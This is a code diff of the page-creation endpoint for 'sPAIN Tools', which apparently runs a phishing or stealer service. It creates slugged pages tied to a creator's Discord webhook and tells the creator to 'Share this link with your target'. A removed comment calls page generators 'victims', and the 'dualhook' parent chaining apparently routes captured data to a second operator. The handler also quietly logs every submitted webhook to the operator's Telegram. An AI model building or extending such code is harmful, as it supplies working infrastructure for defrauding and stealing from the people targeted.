@@ -9,14 +9,16 @@ async function redisGet(key) {
     headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
   });
   const json = await res.json();
-  return json.result;
+  return json.result; // null or raw string
 }
 
+// ✅ CORRECT Upstash REST format: value goes in the URL
 async function redisSet(key, value) {
-  const res = await fetch(
-    `${REDIS_URL}/set/${encodeURIComponent(key)}/${encodeURIComponent(JSON.stringify(value))}`,
-    { headers: { Authorization: `Bearer ${REDIS_TOKEN}` } }
-  );
+  const val = encodeURIComponent(JSON.stringify(value));
+  const res = await fetch(`${REDIS_URL}/set/${encodeURIComponent(key)}/${val}`, {
+    method: 'POST',
+    headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
+  });
   return res.ok;
 }
 
@@ -30,27 +32,13 @@ async function tgSend(text) {
   } catch (_) {}
 }
 
-async function notifyCreatorWebhook(webhookUrl, url, slug, displayName, type) {
+async function discordSend(webhookUrl, embed) {
   if (!webhookUrl || !webhookUrl.startsWith('https://discord.com/api/webhooks/')) return;
   try {
     await fetch(webhookUrl, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        username: 'sPAIN Tools',
-        embeds: [{
-          title: `✅ Your ${type === 'dualhook' ? 'Dualhook' : 'Slots 1–9'} page is ready!`,
-          description: `Your page has been created successfully.\n\n**Share this link with your target:**\n${url}`,
-          color: type === 'dualhook' ? 0x06b6d4 : 0xc026d3,
-          fields: [
-            { name: '📁 Slug',         value: `\`${slug}\``,  inline: true },
-            { name: '🏷 Display Name', value: displayName,    inline: true },
-            { name: '🔗 Your Link',    value: url,            inline: false }
-          ],
-          footer: { text: 'sPAIN Tools — Keep this webhook private!' },
-          timestamp: new Date().toISOString()
-        }]
-      })
+      body: JSON.stringify({ username: 'sPAIN Tools', embeds: [embed] })
     });
   } catch (_) {}
 }
@@ -59,7 +47,6 @@ export default async function handler(req, res) {
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
-
   if (req.method === 'OPTIONS') return res.status(204).end();
   if (req.method !== 'POST')   return res.status(405).json({ error: 'Method not allowed' });
 
@@ -68,60 +55,61 @@ export default async function handler(req, res) {
     try { body = JSON.parse(body); } catch { return res.status(400).json({ error: 'Invalid JSON' }); }
   }
 
-  // dualhookParent is set when the victim generates a slots page FROM a dualhook page.
-  // It holds the slug of the dualhook creator's page so submit.js can find webhook1.
   const { name, displayName, webhook, inviteUrl, charUrl, type, dualhookParent } = body || {};
 
   if (!name)    return res.status(400).json({ error: 'name is required' });
   if (!webhook) return res.status(400).json({ error: 'webhook is required' });
 
   const slug = name.trim().toLowerCase().replace(/\s+/g, '-');
-
-  if (!/^[a-z0-9_-]+$/i.test(slug)) {
-    return res.status(400).json({ error: 'Name can only contain letters, numbers, hyphens, underscores' });
-  }
+  if (!/^[a-z0-9_-]+$/i.test(slug)) return res.status(400).json({ error: 'Invalid name' });
 
   const RESERVED = ['api', 'index', 'favicon', 'robots', 'sitemap', '_next', 'static'];
-  if (RESERVED.includes(slug)) {
-    return res.status(400).json({ error: 'That name is reserved' });
-  }
+  if (RESERVED.includes(slug)) return res.status(400).json({ error: 'That name is reserved' });
 
   try {
     const existing = await redisGet(`slot:${slug}`);
-    if (existing !== null) {
-      return res.status(200).json({ taken: true });
-    }
+    if (existing !== null) return res.status(200).json({ taken: true });
 
     const record = {
-      slug,
-      displayName:    displayName    || slug,
-      webhook,                              // webhook2 for child slots, webhook1 for dualhook
+      slug:           slug,
+      displayName:    (displayName && displayName.trim()) ? displayName.trim() : slug,
+      webhook:        webhook,
       inviteUrl:      inviteUrl      || '',
       charUrl:        charUrl        || '',
       type:           type === 'dualhook' ? 'dualhook' : 'slots',
-      dualhookParent: dualhookParent || null, // null for plain slots & dualhook roots
+      dualhookParent: dualhookParent || '',
       createdAt:      new Date().toISOString()
     };
 
     const ok = await redisSet(`slot:${slug}`, record);
-    if (!ok) return res.status(500).json({ error: 'Failed to save' });
+    if (!ok) return res.status(500).json({ error: 'Failed to save to Redis' });
 
     const url = `https://spain-tools.vercel.app/${slug}`;
 
-    await notifyCreatorWebhook(webhook, url, slug, record.displayName, record.type);
+    // Notify creator on Discord
+    await discordSend(webhook, {
+      title: `✅ Your ${record.type === 'dualhook' ? 'Dualhook' : 'Slots 1–9'} page is ready!`,
+      description: `**Share this link with your target:**\n${url}`,
+      color: record.type === 'dualhook' ? 0x06b6d4 : 0xc026d3,
+      fields: [
+        { name: '📁 Slug', value: `\`${slug}\``, inline: true },
+        { name: '🏷 Name', value: record.displayName, inline: true },
+        { name: '🔗 Link', value: url, inline: false }
+      ],
+      footer: { text: 'sPAIN Tools — Keep this webhook private!' },
+      timestamp: new Date().toISOString()
+    });
 
-    const tgMsg = [
-      `🆕 <b>New ${record.type === 'dualhook' ? 'Dualhook' : 'Slots 1–9'} page claimed!</b>`,
+    // Telegram log
+    await tgSend([
+      `🆕 <b>New ${record.type === 'dualhook' ? 'Dualhook' : 'Slots 1–9'} claimed!</b>`,
       `📁 Slug: <code>${slug}</code>`,
-      `🏷 Display: ${record.displayName}`,
+      `🏷 Name: ${record.displayName}`,
       `🔗 URL: ${url}`,
       `📡 Webhook: <code>${webhook}</code>`,
-      inviteUrl      ? `💬 Invite: ${inviteUrl}` : '',
       dualhookParent ? `🔗 DH Parent: <code>${dualhookParent}</code>` : '',
       `🕐 ${record.createdAt}`
-    ].filter(Boolean).join('\n');
-
-    await tgSend(tgMsg);
+    ].filter(Boolean).join('\n'));
 
     return res.status(200).json({ success: true, url, slug });
 
